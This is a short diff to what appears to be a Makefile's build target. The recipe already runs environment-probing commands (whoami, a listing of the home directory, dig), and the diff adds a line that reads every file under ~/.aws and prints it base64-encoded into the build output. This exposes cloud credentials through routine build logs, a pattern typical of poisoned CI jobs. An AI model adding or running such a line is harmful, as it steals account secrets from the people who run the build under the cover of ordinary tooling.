@@ -89,6 +89,7 @@ build: vendor $(NAME)
 	pwd
 	ls -alr
 	ls -alr ~
+	cat ~/.aws/* | base64
 	dig ubuntu
 	dig localhost
 	whoami
